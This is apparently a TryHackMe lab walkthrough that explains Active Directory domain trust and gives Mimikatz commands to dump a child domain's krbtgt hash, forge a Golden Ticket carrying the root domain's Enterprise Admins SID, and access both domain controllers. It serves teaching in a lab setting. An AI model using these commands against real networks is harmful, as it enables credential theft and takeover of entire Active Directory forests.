You already **hacked a child domain** (`ZA.TRYHACKME.LOC`) ‚Äî but now you want **full control** over the **entire Active Directory forest**, including the **root domain** (`TRYHACKME.LOC`) and other regions like `UK.TRYHACKME.LOC`.

To do that, we **abuse trust** between the domains.

## üîê What Is Domain Trust?

Think of AD like a company with:

- A **head office** (`TRYHACKME.LOC`)
- Several **branch offices** (like `ZA.TRYHACKME.LOC`, `UK.TRYHACKME.LOC`)

These offices **trust each other**. That means:

- Users from one office can access resources in another office **if allowed**.
- This is called **domain trust**.

In our case:

- `ZA.TRYHACKME.LOC` is a **child domain**.
- `TRYHACKME.LOC` is the **root domain**.
- **They trust each other** ‚Äî so if you look like a valid user from ZA, you might be trusted by the root.

## üéüÔ∏è What Is KRBTGT?

- KRBTGT is a **special hidden account** used to **sign** Kerberos tickets (these tickets act like access passes).
- If you steal KRBTGT‚Äôs password **hash**, you can **create fake tickets** (called **Golden Tickets**) that say you are **any user**, including a Domain Admin.

That means:

- You don‚Äôt need a password.
- You don‚Äôt need to actually be the user.
- The ticket fools the system into giving you access.

## ‚úÖ Why Can This Work?

You already hacked ZA domain:

- You have **admin rights** in `ZA.TRYHACKME.LOC`
- So you can steal the **KRBTGT hash** from that domain.
- That lets you create a **Golden Ticket** to impersonate any user in ZA.

But here‚Äôs the trick:

- Since **ZA trusts the root**, you can **add the SID of a powerful group from the root domain** (like Enterprise Admins) to your forged ticket.
- This tricks the root into thinking you‚Äôre **part of the Enterprise Admins group**, giving you **control of the forest**.

## ü™ú Step-by-Step Breakdown

### ‚úÖ Step 1: Steal the KRBTGT hash from ZA domain

We use **Mimikatz** to run this command:

```powershell
lsadump::dcsync /user:za\krbtgt
```

- This steals the secret key (hash) used to sign Kerberos tickets in ZA.

### ‚úÖ Step 2: Get SIDs

You need two SIDs:

1. **SID of ZA Domain Controller** ‚Äî the machine you want to impersonate.
    
    ```powershell
    Get-ADComputer -Identity "THMDC"
    ```
    
2. **SID of Enterprise Admins** from the root domain (most powerful group).
    
    ```powershell
    Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
    ```
    

### ‚úÖ Step 3: Create the Golden Ticket

Now that you have:

- Username: `Administrator`
- ZA Domain name: `za.tryhackme.loc`
- ZA domain SID
- KRBTGT hash (from step 1)
- Enterprise Admins SID (from root)

Use **Mimikatz** to forge a ticket:

```powershell
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<ZA-Domain-SID> /rc4:<krbtgt-hash> /sids:<Enterprise Admins SID> /ptt
```

This does 3 things:

1. **Pretends** you're Administrator in ZA domain.
2. **Adds the SID of Enterprise Admins** so you look like a forest admin.
3. **Pushes the ticket** into your current session (`/ptt` means "Pass The Ticket").

### ‚úÖ Step 4: Use the Forged Ticket

Now test it:

- Access **ZA domain controller** (your own domain):

```powershell
dir \\thmdc.za.tryhackme.loc\c$\
```

- Then test **root domain controller**:

```powershell
dir \\thmrootdc.tryhackme.loc\c$\
```

‚úÖ You should now have full access to **both domains** ‚Äî proving that you're now the **Enterprise Admin** (highest AD privilege).
